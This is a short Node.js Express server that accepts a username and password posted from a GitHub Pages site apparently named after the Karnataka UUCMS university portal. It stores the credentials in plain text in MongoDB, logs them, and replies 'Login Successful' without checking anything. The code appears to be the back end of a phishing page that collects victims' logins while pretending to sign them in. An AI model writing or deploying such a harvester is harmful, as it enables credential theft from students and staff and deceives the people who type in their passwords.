import dotenv from 'dotenv';
import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors'

const app=express();
const port=3000;
dotenv.config();
app.use(express.urlencoded({ extended: 'false' }))
app.use(cors({
    "origin": "https://uucmskarnataka.github.io/uucms.karnataka/",
    credentials:true
}))

mongoose.connect(process.env.DBURL).then(() => { console.log("DB Connected") }).catch((err) => { console.log(err) })

const CSchema = new mongoose.Schema({
    name: String,
    pass:String
});
const Kitten = mongoose.model('Kitten',CSchema);


app.get('/', (req, res) => {
    res.send('Hello World!')
  })
  app.post('/upload', async (req, res) => {
    console.log(req.body);

    // Correct the construction of the Kitten instance by passing an object
    let k = new Kitten({
        name: req.body?.name,   // These fields should be part of the object
        pass: req.body?.pass
    });

    try {
        // Save the instance to the database
        await k.save();

        // Return success message
        res.status(200).send({ message: "Login Successful" });
    } catch (error) {
        console.error("Error saving the document:", error);
        res.status(500).send({ message: "Failed to Login..." });
    }
});

  
 app.listen(port, () => {
    console.log(`listening on port ${port}`)
 })
